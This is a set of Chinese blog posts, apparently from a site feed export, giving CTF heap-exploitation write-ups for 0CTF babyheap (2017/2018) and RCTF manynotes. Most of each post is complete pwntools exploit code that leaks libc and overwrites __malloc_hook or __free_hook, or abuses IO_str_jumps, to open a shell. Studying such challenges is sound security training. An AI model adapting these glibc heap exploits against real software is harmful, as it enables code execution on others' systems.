p64(0x60201d)p.send(payload)p.recvuntil('Action: ')p.sendline('1')p.recvuntil('Size: ')p.sendline(str(0x60))p.recvuntil('blocks: ')p.sendline('0')p.recvuntil('(0/1): ')p.sendline('1')p.recvuntil('Input: ')payload = '/bin/sh\x00' + '\x00'*3 payload+= p64(0x400978) #addr of systempayload+= p64(0)*(0x60/8)p.send(payload)p.interactive() PS：我发现似乎线程与程序交互的数据只能配了context.log_level = ‘debug’，才能看得出来，打开shell以后也必须这样，去掉context.log_level = ‘debug’，程序的交互将不可见。 2019_RCTF_manynotes:题目：manynotes 这道题乍一看，和2018_Nu1CTF_null差不多，漏洞点相同，但是仔细看的话是他的进化版。 首先string ./libc.so.6 | grep GLIBC来判断libc的版本为2.26，存在tcache。 但是因为洞是一样的，所以开始的时候还是以2018Nu1LCTF_null的思路来做，也是比较顺利，到达溢出点后，开始出现错误，溢出了线程的malloc_state后，改写其0x70位置的fastbinY[]为malloc_hook-0x23，然后申请发现会出错。。。调试到_int_malloc之后找出错点，如下： 我们可以看到，malloc_hook-0x23处的地址的确变为了victim，但是在遍历循环时，_int_malloc想对victim的fd指向的chunk干一些事（[rsi+0x10]代表的意义就是victim-&gt;fd-&gt;fd），因为2.26的源码我还没读，所以我不是很知道这是干啥的orz，但是因为fd处的数据是非法的，读他指向的内容肯定会报错。。。所以只能另寻他法。 最简单的一种就是继续往后溢出，改写tcache_bin，然后伪造一个tcache到malloc_hook-8，然后申请对应的size的chunk，之后进行realloc微调即可。 看网上的wp，说利用house of orange也可以。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#coding:utf-8from pwn import *path = './many_notes'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,times,choice,content): p.recvuntil('Choice: ') p.send('0') p.recvuntil('Size: ') p.send(str(size)) p.recvuntil('Padding: ') p.send(str(times)) p.recvuntil('(0/1): ') p.send(str(choice)) if choice == 1: p.recvuntil('Content: ') p.send(content)p.recvuntil('name: \n')name = 'a'*8p.send(name)p.recvuntil('a'*8)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fd4f3024760-0x00007fd4f2c38000)log.success('libcbase = '+hex(libcbase))for i in range(23): new(0x2000-0x10,0x400-1,0,'\x00') new(0x2000-0x10,0x3fd-1,0,'\x00')'''payload = '\x00' + p64(0)*15*2#payload+= p64(libcbase - (0x00007f36d7dcc000-0x00007f36d0000020)) + p64(0)#payload+= p64(0x3fff000) + p64(0x3fff000)payload+= p64(0)*9payload+= p64(libcbase+libc.sym['__malloc_hook']-0x23)#payload+= p64(0)*4#payload+= p64(libcbase+(0x7f6ec00008c0-0x00007f6ec6c85000))new(0x1f00-0x10,0,1,'\x11'*(0x1f00-0x10-1))p.send(payload)gdb.attach(p)one_gadget = [0x4f2c5,0x4f322,0x10a38c]payload = '\x00'*0x13 + p64(libcbase + one_gadget[0])new(0x60,0,0,payload)'''new(0x1f00-0x10,0,1,'\x11'*(0x1f00-0x10-1))payload = '\x00'payload+= p64(0) + p64(0x20e1) p.send(payload)new(0x800+0x7c1-0x10,0,0,'\x00')new(0x800+0x1a0-0x10,0,0,'\x00')new(0x240+0x280,0,0,'\x00')payload = '\x01' + '\x00'*7payload+= p64(0)*7payload+= p64(libcbase+libc.sym['__malloc_hook']-8)payload = payload.ljust(0x240,'\x00')new(0x240,0,1,payload)one_gadget = [0x4f2c5,0x4f322,0x10a38c]payload = p64(libcbase+one_gadget[0]) + p64(libcbase+libc.sym['realloc']+2)new(0x10,0,1,payload)p.recvuntil('Choice: ')p.send('0')p.recvuntil('Size: ')p.send(str(0x20))if attach == 1: gdb.attach(p)p.interactive() 一些关于线程的指令:arenainfo :打印所有线程的arena信息。在pwndbg中可以使用。 info threads:打印当前程序中所有线程 thread id:切换线程，id看info threads中所标的。 参考链接：free_list的简介 pthread_join及linux线程 https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/ 关于TLS]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5种解法解20170ctf_babyheap]]></title>
    <url>%2F2019%2F06%2F11%2F5%E7%A7%8D%E8%A7%A3%E6%B3%95%E8%A7%A32017_0ctf_babyheap%2F</url>
    <content type="text"><![CDATA[(这其实这是我的网安实践作业。。。后来觉得放上来凑个数吧。。。orz 第一次解：预览题目：可以看到文件为64位，保护全开，给了libc（版本为2.24），标准的堆题。。。看到full relro一般为改hook为one_gadget。放进ida里进一步分析： 主要功能分析及漏洞寻找：可以看到程序开始时先选了一段随机不可控的地址来储存chunk指针列表的基地址（base_ptr）。紧接着就进入了死循环，打印菜单，输入选项，运行函数。我们来逐个分析功能： 在allocate()功能中，我们发现申请的chunk的大小可以由我们自己决定（小于0x1000），是可控的，且heap结构体中会储存我们申请到的chunk的大小。此外，我们申请堆块时用的是 calloc() 而不是malloc()这意味着堆块的数据开始时要被初始化为0，这一点需要注意。 fill()函数就是向我们申请过的chunk里填数据，不过有一个很明显的任意溢出更改漏洞。 free()就是将chunk指针free()，没有uaf漏洞。 print()函数就是打印对应下标的chunk的content，不过打印的内容是根据我们在allocate()时输入的size来决定的。 思考如何利用漏洞：首先我们的最终目标定为：将malloc_hook改为one_gadget，现阶段，我们只能借助于程序自身的fill()功能来进行写，而fill()功能又需要一个堆指针，所以我们的目标转化为如何使堆指针分配到malloc_hook附近，我们运用fastbinattack功能与overlapping结合的方法来实现。 leak:因为我们要确定malloc_hook的地址与one_gadget的地址，所以必须泄露出libc才能继续往下进行。 我们可以利用程序的print()功能来实现泄露libc地址，先申请4个chunk（chunk2大小为smallchunk），然后通过0来改写1的size，然后通过标准的overlapping方法，先free()再malloc()，然后chunk2现在在1的里面，(这里要注意，因为是calloc，所以再次申请chunk1的时候，chunk2的chunk_header会被清零，需要fill()重新布置一下)，然后free chunk2，将其放入unsortedbin中，然后通过chunk1的print()打印出chunk2的fd指针，成功泄露libc。 控制程序执行流:之后我们就可以先把chunk2（大小我们申请为0x60）放进fastbin里，然后通过chunk1改其fd指针为&amp;main_arena-0x33，然后在申请两次即可，然后再通过改chunk4的内容来改malloc_hook，再申请则会触发one_gadget。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------#---------------2.change------------------p.sendline('1') #index 2p.recvuntil(': ')p.sendline(str(96))#gdb.attach(p)free(2)#gdb.attach(p)fake_chunk_addr = main_arena_addr - 0x33payload = 'a'*0x20+p64(0)+p64(0x71)+p64(fake_chunk_addr)fill(1,len(payload),payload)#gdb.attach(p)allocate(0x60) #index 2#gdb.attach(p)allocate(0x60) #index 4payload = 'a'*0x13 + p64(one_gadget_addr)fill(4,len(payload),payload)allocate(0x20)p.interactive() 反思，拓展与多解：回过头来看这一题，就是一道中规中矩的堆题，堆的理论知识扎实并且调试能力不错的人解出应该只是时间问题。又因为这道题漏洞太多，题目所做的限制（申请的堆块大小不限制，chunk的所在范围不限制，任意溢出漏洞，有upgrade功能，有输出打印功能等等）也太少，正好借这次作业的机会来复习一下之前学过的一些堆利用的基础姿势。 第二种解_realloc_hook微调栈环境：说是第二种解，其实只是在第一种基础解上略加改动，用了一个小技巧而已，在main_arena上方0x20处是realloc_hook和malloc_hook，我们第一种解法是将malloc_hook直接改为one_gadget，这种解法其实有很大的运气成分，因为one_gadget的成功是需要条件的，需要[rsp+0xxx] == NULL 时才会成功有时候我们不能保证这个条件成立，这时就有一个技巧叫做realloc_hook微调，利用realloc_hook来调整栈环境，因为我们将chunk直接伪造在&amp;main_arena-0x33处，所以我们可以把realloc_hook和malloc_hook全都控制，realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址，所以我们把realloc_hook设为one_gadget的地址，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#coding:utf-8from pwn import *context(os='linux',arch='amd64',terminal = ['terminator','-x','sh','-c'])#context.log_level='debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))allocate(0x60) #0allocate(0x60) #1allocate(0x60) #2allocate(0x60) #3allocate(0x60) #4allocate(0x60) #5 payload='a'*96+p64(0x00)+chr(0xe1)fill(2,len(payload),payload)delete(3)allocate(0x60)#3 p.sendline('4')p.recvuntil('Index:')p.sendline('4')p.recvuntil('Content: \n')libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7f88fe7e9b78- 0x7f88fe425000)log.success('libcbase = '+hex(libcbase)) #gdb.attach(p)sys = libcbase + libc.symbols['system']re_hook = libcbase + libc.symbols['__realloc_hook']mac_hook = libcbase + libc.symbols['__malloc_hook']realloc = libcbase + libc.symbols['__libc_realloc']allocate(0x60)#6 delete(4)payload=p64(mac_hook-0x23)fill(6,len(payload),payload)allocate(0x60)#4allocate(0x60)#7payload='a'*0xb + p64(libcbase+0x4526a) + p64(realloc+8)fill(7,len(payload),payload)allocate(0x60)#gdb.attach(p)p.interactive() 第三种解_将topchunk迁移到free_hook上方：同malloc_hook类似，在调用free函数时会先检验free_hook的值。但是free_hook上方都是0字节。不能直接通过fastbin_attack进行攻击，可以先通过fastbinattack修改topchunk_addr为&amp;__free_hook-0xb58，之后申请内存至free_hook修改为system地址。fastbin数组在top chunk指针上方。可以通过free fastbin chunk修改fastbin数组的值使的fastbin attack可以实现。 存在限制要求堆的地址以0x56开头(原因看最后一种解法largebinattack。) exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *context(os='linux',arch='amd64',terminal = ['terminator','-x','sh','-c'])#context.log_level='debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))while 1: try: p = process('./babyheap') allocate(0x40) #0 allocate(0x40) #1 allocate(0x40) #2 allocate(0x40) #3 allocate(0x40) #4 allocate(0x40) #5 allocate(0x60) allocate(0x60) delete(6) payload = 'a'*64+p64(0x00)+chr(0xa1) payl = '/bin/sh'+chr(0) fill(0,len(payl),payl) fill(2,len(payload),payload) delete(3) allocate(0x40)#3 p.sendline('4') p.recvuntil('Index:') p.sendline('4') p.recvuntil('Content: \n') libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7ff5f5385b78-0x7ff5f4fc1000) free_hook=libcbase + libc.symbols['__free_hook'] log.success('libcbase = '+hex(libcbase)) allocate(0x40) delete(6) payload = p64(libcbase+(0x7f8655ab2b4d-0x7f86556ee000)) fill(4,len(payload),payload) #gdb.attach(p) allocate(0x40) allocate(0x40) #8 payload = 'a'*0x1b+p64(free_hook-0xb58) fill(8,len(payload),payload) #gdb.attach(p) for i in range(0,6): allocate(0x200) system = libcbase + libc.symbols['system'] payload = chr(0)*0xf8+p64(system) fill(14,len(payload),payload) delete(0) break except EOFError: p.close()p.interactive() 第四种解_largebin_attack构造fakechunk：因为申请的chunk大小不受限制，所以largebin_attack当然在我们的考虑范围之内，largebinattack的主要效果为在任意地址写入堆地址，实际运用就是用堆地址的开头0x55/0x56来进行chunk的size的错位构造，所以我们就可以在free_hook的上方写入堆地址，然后利用fakechunk来改写free_hook为system，之后运行system(‘/bin/sh\x00’)获取shell。但是需要注意的是并不是一定能成功，因为当size为0x55(1010101)时被free会报错，而0x56(1010110)却不会,因为第二个bit位为0时会被认为是mmap出来的地址从而free这块地址会报错，而为1时则不会，所以加个循环就OK了。 关于largebin_attack的技术在赛题中出现较少，可参考以下链接学习： veritas师傅的blog ctf-wiki 从2019西湖论剑的一道题来看largebinattack exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')#,env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)libc=ELF('./libc.so.6')def new(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def upgrade(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def view(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))while 1: try: p = process('./babyheap') new(0x90) #0 new(0x90) #1 new(0x90) #2 new(0x90) #3 payload = '\x00'*0x90 + p64(0) + p64(0x141) upgrade(0,len(payload),payload) delete(1) new(0x90) #1 view(2) p.readuntil('Content: \n') libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7fcbd010eb78- 0x7fcbcfd4a000 ) free_hook = libcbase + libc.symbols['__free_hook'] log.success('libcbase = '+hex(libcbase)) log.success('free_hook = '+hex(free_hook)) new(0x90) #4 p.sendline('3') p.recvuntil('Index: ') p.sendline(str(3)) delete(2) delete(1) delete(0) new(0x20) #0 new(0x4d0) #1 new(0x20) #2 new(0x4e0) #3 new(0x20) #5 delete(1) new(0x500) #1 payload = '/bin/sh\x00' + p64(0)*3 + p64(0) + p64(0x4e1) + p64(0) + p64(free_hook-0x20+8) + p64(0) + p64(free_hook-0x40+3) upgrade(0,len(payload),payload) delete(3) payload = p64(0)*4 + p64(0) + p64(0x4f1) + p64(0) + p64(free_hook-0x20) upgrade(2,len(payload),payload) new(0x40) #3 system_addr = libcbase + libc.sym['system'] payload = '\x00'*0x10 + p64(system_addr) upgrade(3,len(payload),payload) delete(0) break except EOFError: p.close()#gdb.attach(p)p.interactive() 第五种解_利用IO_str_jump来运行system(‘/bin/sh\x00’)：有任意溢出这种大漏洞存在，所以可以溢出到topchunk的内容，IO_FIFE的利用方法就很容易被想到，因为libc2.24较libc2.23对vtable_ptr做了范围检查，我们不能直接控制他，house of orange技术将不再适用，但当然有新的技术衍生出来，就是利用IO_str_jump。具体原理参考以下链接： 新手向——IO_file全流程浅析 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap',env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------io_str_jumps = libcbase + (0x7fc707c647a0 - 0x7fc7078a1000)io_list_all = libcbase + (0x7f82cc242520-0x7f82cbe7d000 )system_addr = libcbase + libc.sym['system']sh_addr = libcbase + libc.search('/bin/sh\x00').next() log.success('system_addr = '+hex(system_addr))log.success('io_str_jumps = '+hex(io_str_jumps))log.success('io_list_all = '+hex(io_list_all))payload = p64(0)*4payload+= p64(0)+p64(0x61)payload+= p64(0)+p64(io_list_all-0x10)payload+= p64(0)+p64(1)payload+= p64(0)+p64(sh_addr)payload = payload.ljust(0xe8+0x10,'\x00')payload+= p64(io_str_jumps-8) + p64(0) + p64(system_addr)p.sendline('2')p.recvuntil('Index: ')p.sendline(str(1))p.recvuntil('Size: ')p.sendline(str(len(payload)))p.recvuntil('Content: ')p.send(payload)p.recvuntil('Command: ')p.sendline('1')p.recvuntil(': ')p.sendline(str(0x10))#gdb.attach(p)p.interactive() 结语：以上就是所有的五种解法，说是解法，其实只是一些小技巧而已，这道题漏洞点较多，所以可以运用的方法比较多，正常比赛的情况下pwn题顶多也就2种解法，非预期解很难实现。以上这些技巧都是堆题中经常碰到的，需要熟练掌握才能在比赛中游刃有余地分析程序的漏洞，而不是卡在漏洞利用上。。 参考链接：看学的师傅]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>0CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从2017/2018/20190ctf_babyheap看fastbin_attack]]></title>
    <url>%2F2019%2F06%2F09%2F2017-2018-2019-0ctf-babyheap-writeups%2F</url>
    <content type="text"><![CDATA[之前写过一个2017和2018的结合版分析，但是最近把2019年的复盘了，觉得三个在一起吧，算是fastbin_attack一个较完整的经历路程。 先来看2017的题目：预览：可以看到文件为64位，保护全开，给了Libc，标准的堆题。。。看到full relro一般为改hook为one_gadget。放进ida里进一步分析： 主要功能分析及漏洞寻找：可以看到程序开始时先选了一段随机不可控的地址来储存heap列表的基地址（base_ptr）。紧接着就进入了死循环，打印菜单，输入选项，运行函数。逐个分析功能： allocate()功能中，我们发现heap的content大小由我们自己决定（小于0x1000），是可控的，且heap结构体中会储存heap内容的大小。此外，我们申请堆块时用的是 calloc() 这意味着堆块的数据开始时要被初始化为0，这一点需要注意 fill()函数就是向我们申请过的chunk里填数据，不过有一个很明显的任意溢出更改漏洞。 free()就是将chunk指针free()，没有uaf漏洞。 print()函数就是打印对应下标的chunk的content，不过打印的内容是根据我们在allocate()时输入的size来决定的。 思考如何利用漏洞：首先我们的最终目标定为：将malloc_hook改为one_gadget，现阶段，我们只能借助于程序自身的fill()功能来进行写，而fill()功能又需要一个堆指针，所以我们的目标转化为如何使堆指针分配到malloc_hook附近，我们运用fastbin功能与overlapping结合的方法来实现。 leak:因为我们要确定malloc_hook的地址与one_gadget的地址，所以必须泄露出libc。 泄露功能，我们可以利用程序的print()功能来实现，先申请4个chunk（chunk2大小为smallchunk），然后通过0来改写1的size，然后通过标准的overlapping方法，先free()再malloc()，然后chunk2现在在1的里面，(这里要注意，因为是calloc，所以再次申请chunk1的时候，chunk2的chunk_header会被清零，需要fill()重新布置一下)，然后free chunk2，将其放入unsortedbin中，然后通过chunk1的print()打印出chunk2的fd指针，成功泄露libc。(这一部分不理解的可以看我文末的心得，有我第一次做的时候查的资料，帮助理解。) change:之后我们就可以先把chunk2（大小我们申请为0x60）放进fastbin里，然后通过chunk1改其fd指针为&amp;main_arena-0x33，然后在申请两次即可，然后再通过改chunk4的内容来改malloc_hook，再申请则会触发one_gadget。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------#---------------2.change------------------p.sendline('1') #index 2p.recvuntil(': ')p.sendline(str(96))#gdb.attach(p)free(2)#gdb.attach(p)fake_chunk_addr = main_arena_addr - 0x33payload = 'a'*0x20+p64(0)+p64(0x71)+p64(fake_chunk_addr)fill(1,len(payload),payload)#gdb.attach(p)allocate(0x60) #index 2#gdb.attach(p)allocate(0x60) #index 4payload = 'a'*0x13 + p64(one_gadget_addr)fill(4,len(payload),payload)allocate(0x20)p.interactive() 再来看2018的题目：主要功能分析与漏洞寻找：和2017年的题目类似，有一些小的变化，一个是allocate()最大只能申请0x58的chunk（虽然条件变得苛刻，但是等于从侧面告诉了我们方向是fastbin_attack），然后是fill()不再有任意溢出漏洞，而是只有off-by-one漏洞，这不影响overlapping，只是方法要复杂一点。 思考如何利用漏洞：leak:第一步肯定还是先想leak出libc，但是这个可能就有点小麻烦了。。。我们首先想到老方法：overlapping之后用大块打印小块的内容，但是小块一定是大于0x80的，所以我们不可能打印出小块的全部内容，我们也只需要fd指针位置的内容，这一点是可行的，但是因为chunk大小的限制，我们必须经过精心构造，来绕过检查。做了其他的fastbin_attack的题目后，又用了新方法：两个指针控制同一块chunk。。。。先将一块chunk（overlapping的小块）放进fastbin，然后利用overlapping的大块改其的fd指针最后一位为我们想要的重叠位置的chunk的地址的最后一位，因为内存页分配原则，导致他们地址除了最后的一个字节不一样，其他都一样。再malloc两次就完事，然后当重叠的chunk被free以后，还是可以通过另外一个堆指针来打印fd的内容，进行泄露。 change:这里也要注意，因为chunk最大为0x60，所以原来的直接把&amp;main_arena-0x33位置放进fastbin里已经失效（size为0x70），需要想别的办法。。。这里需要改top_chunk的地址(这里做的时候没想到。。。orz)，首先要知道top_chunk的地址在&amp;main_arena+80，而在&amp;main_arena+80和&amp;main_arena之间是用来存放fastbinY的，其值是fastbin中各个大小的的bins的头指针，如果全都没有的话则全为零，所以我们必须要一个chunk（其大小不能太小，不然离&amp;main_arena+88太远控制不了）来压住，并利用其来伪造出fake_chunk的size。然后我们可以将fake_chunk设在伪造处，然后fill()更改top_chunk的地址为我们计划的地址（&amp;main_arena-0x33)，再次申请一个chunk（大小可以覆盖到malloc_hook）即可，然后再fill()更改其值。 exp如下（leak用的新方法）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc-2.24.so')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(length))def update(ID,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(len(payload))) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def view(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))#leak出libcsize = 0x28allocate(size) #index 0allocate(size) #index 1allocate(size) #index 2allocate(size) #index 3size = 0x80allocate(size) #index 4payload = 'a'*0x28 + p8(0x61)update(0,payload)delete(1)allocate(0x50) #index 1delete(0)payload = 'a'*0x20+p64(0)+p64(0x31)update(1,payload)delete(2)payload = 'a'*0x20+p64(0)+p64(0x31)+p8(0xc0)update(1,payload)#gdb.attach(p)payload = 'a'*0x20+p64(0)+p8(0x31)update(3,payload)allocate(0x28) #index 0allocate(0x28) #index 2payload = 'a'*0x20+p64(0)+p8(0x91)update(3,payload)allocate(0x80) #index 5payload = 'a'*0x20+p64(0)+p64(0x31)update(5,payload)delete(4)view(2)p.recvuntil('Chunk[2]: ')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88log.success('main_arena='+hex(main_arena_addr))#gdb.attach(p)libcbase = main_arena_addr - 0x3c4b20one_gadget = 0x4526aone_gadget_addr = one_gadget + libcbaselog.success('libc=' + hex(libcbase))log.success('one_gadget='+hex(one_gadget_addr))#gdb.attach(p)#改malloc_hook的值为one_gadget'''#gdb.attach(p)payload = 'a'*0x20+p64(0)+p64(0x71) update(1,payload)payload = p64(0)+p64(0x81)update(2,payload)delete(0)payload = 'a'*0x20+p64(0)+p64(0x71)+p64(main_arena_addr-0x33)update(1,payload)#gdb.attach(p)''' allocate(0x48) #index 4delete(4)payload = p64(main_arena_addr+37)update(2,payload)allocate(0x58)delete(4)allocate(0x48) #index 4#gdb.attach(p)allocate(0x48) #index 6#gdb.attach(p)payload = '\x00'*35 + p64(main_arena_addr-0x33)update(6,payload)#gdb.attach(p)allocate(0x48) #index 7payload = '\x00'*0x13 + p64(one_gadget_addr)update(7,payload)#gdb.attach(p)allocate(0x48)'''allocate(0x60) #index 6payload = 'a'*0x13 + p64(one_gadget_addr)update(6,payload)'''p.interactive() 我第一次做两道题的时候的一些心得：2017-0ctf-babyheap: 这一题准备自己独立做的，结果只能相出大致思路，不会leak无法入手，看了writeup，学会了新姿势，也对fastbin attack有了更深的认识。 leak出libc的方法除了泄露got表外，还有另一种：通过泄露main_arena来泄露libc。详情见链接： 利用main_arena泄露libc __malloc_hook为函数指针，当其不为NULL时，优先调用其指向的函数，一般有堆题又开了full relro的基本为这种，或者是free的。 fastbin attack我的体会是其先free将chunk送入fastbin，然后如果有uaf的话直接改写其fd指针，没有uaf的话就通过溢出或者overlapping（需要off_one_by）来改写fd指针，然后再malloc使堆指针指向我们计划好的地方（这里需要注意要通过fastbin的检查，fake_chunk的size要和malloc(size)的size一样）。 fastbin的大小范围（总大小）为大于等于0x20小于等于0x80。 unsortedbin 的一些体会：ptr=malloc(0x80)，free(ptr),会被分到unsortedbin中，unsortedbin的结构图在上面的链接里有，其是在main_arena+88处 